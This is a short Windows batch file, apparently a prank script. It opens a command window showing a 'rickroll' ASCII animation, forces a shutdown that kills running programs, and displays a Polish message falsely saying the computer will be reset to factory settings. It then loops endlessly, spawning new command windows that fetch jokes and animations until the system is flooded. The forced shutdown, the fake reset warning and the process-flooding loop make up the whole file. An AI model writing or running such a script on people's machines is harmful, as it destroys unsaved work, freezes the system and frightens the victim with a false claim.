@echo off
start cmd /k "color 7 && curl ascii.live/rick"
timeout /t 5

shutdown -s -t 10 -y -f -c "Twoj komputer zostanie przywrocony do ustawien fabrycznych"


:START
start cmd /k "curl https://icanhazdadjoke.com && color 6"
start cmd /k "color 7 && curl ascii.live/rick"
start cmd /k "color 11 && curl ascii.live/nyan"
GOTO START